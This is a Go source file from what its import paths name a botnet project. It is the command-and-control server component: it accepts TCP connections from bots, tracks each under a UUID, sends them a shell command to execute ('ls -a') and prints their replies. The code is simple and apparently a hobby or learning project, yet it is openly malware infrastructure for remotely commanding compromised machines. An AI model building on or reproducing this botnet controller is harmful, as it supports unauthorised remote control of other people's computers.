package client

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"strconv"

	"github.com/satori/go.uuid"

	"github.com/phanletrunghieu/botnet/common/cmd"
	"github.com/phanletrunghieu/botnet/server/domain"
)

// Service struct
type Service struct {
	listener net.Listener
	Clients  map[uuid.UUID]*domain.Client
	Error    chan error
}

// NewClientService create tcpService struct
func NewClientService(port int) *Service {
	ln, err := net.Listen("tcp", ":"+strconv.Itoa(port))

	service := &Service{
		listener: ln,
		Clients:  make(map[uuid.UUID]*domain.Client),
		Error:    make(chan error),
	}

	if err != nil {
		service.Error <- err
	}

	return service
}

// Run wait for a connection
func (s *Service) Run() {
	s.acceptConnection()
}

func (s *Service) acceptConnection() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			s.Error <- err
			continue
		}

		client := &domain.Client{
			ID:   uuid.NewV4(),
			Addr: conn.RemoteAddr(),
			Conn: conn,
		}

		s.Clients[client.ID] = client

		go s.handleConnection(client)

		log.Println("Clients:", len(s.Clients))
	}
}

func (s *Service) handleConnection(client *domain.Client) {
	for {
		conn := client.Conn
		fmt.Fprintf(conn, cmd.Execute+"ls -a\r")
		// listen for replies
		msg, err := bufio.NewReader(conn).ReadString('\r')
		if err != nil {
			if err == io.EOF {
				delete(s.Clients, client.ID)
			}
			fmt.Println("xxxxxxxx", err)
			return
		}
		fmt.Print(msg)
	}
}

// ListClientID list all client id
func (s *Service) ListClientID() []string {
	listIDs := []string{}
	for _, client := range s.Clients {
		listIDs = append(listIDs, client.ID.String())
	}
	return listIDs
}